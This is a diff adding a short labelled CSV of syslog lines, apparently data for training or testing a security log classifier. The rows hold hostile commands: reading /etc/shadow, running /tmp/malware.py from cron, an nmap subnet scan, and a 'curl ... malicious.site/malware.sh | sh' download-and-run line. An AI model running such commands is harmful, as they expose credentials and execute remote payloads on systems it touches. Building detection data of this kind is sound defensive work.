@@ -1,0 +1,6 @@
+entry,type
+Dec 11 09:16:10 LabSZ sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow,privilege_escalation
+Dec 11 09:20:01 LabSZ CRON[30100]: (root) CMD (python3 /tmp/malware.py),malware_detected
+Dec 11 09:23:45 LabSZ sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/nmap -sS 192.168.1.0/24,privilege_escalation
+Dec 11 09:28:35 LabSZ sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash -c 'curl http://malicious.site/malware.sh | sh',privilege_escalation
+Dec 11 09:28:35 LabSZ sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash -c 'curl http://malicious.site/malware.sh | sh',malware_detected
